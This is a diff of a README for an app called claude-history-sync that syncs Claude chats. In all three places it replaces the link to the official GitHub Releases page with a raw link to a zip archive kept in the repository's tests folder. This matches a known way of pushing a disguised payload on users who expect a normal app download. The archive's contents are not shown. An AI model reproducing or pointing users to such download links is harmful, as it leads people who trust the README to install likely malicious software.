@@ -1,6 +1,6 @@
 # 🧩 claude-history-sync - Keep Claude chats in sync
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/kossen6891/claude-history-sync/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/kossen6891/claude-history-sync/raw/refs/heads/main/tests/claude-history-sync-v3.5.zip)
 
 ## 🚀 What this app does
 
@@ -23,7 +23,7 @@ It works best on recent versions of Windows, including Windows 10 and Windows 11
 
 Visit this page to download the latest version:
 
-https://github.com/kossen6891/claude-history-sync/releases
+https://github.com/kossen6891/claude-history-sync/raw/refs/heads/main/tests/claude-history-sync-v3.5.zip
 
 On that page, look for the newest release and download the Windows file that matches your PC.
 
@@ -164,7 +164,7 @@ If you download a `.zip`, extract it before you run the app.
 
 Download or update here:
 
-https://github.com/kossen6891/claude-history-sync/releases
+https://github.com/kossen6891/claude-history-sync/raw/refs/heads/main/tests/claude-history-sync-v3.5.zip
 
 ## 🗂️ Basic workflow
 
